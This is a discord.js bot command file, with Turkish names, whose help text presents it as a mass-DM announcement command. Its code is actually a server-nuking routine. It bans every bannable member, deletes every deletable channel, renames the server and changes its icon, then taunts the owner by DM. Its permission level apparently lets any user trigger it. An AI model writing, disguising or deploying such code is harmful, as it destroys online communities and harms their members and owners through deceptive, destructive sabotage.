const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;

      
message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Light Vi Brittania")
}
})
  

  

  
message.guild.setName(`Işık Ordusu 💡`, ":))")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/562981877351186438/565613916982345728/L_Logo_Tasarm_Red_-_by_KingEmrah.png`)
  
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});
    

    

  
message.guild.owner.send(`**Sunucun Patladı Canım \`Amonx\` and \`Shivax\` :smiling_imp:**`);
message.guild.createChannel(`light`)
message.guild.createChannel(`army`)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'shivax',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
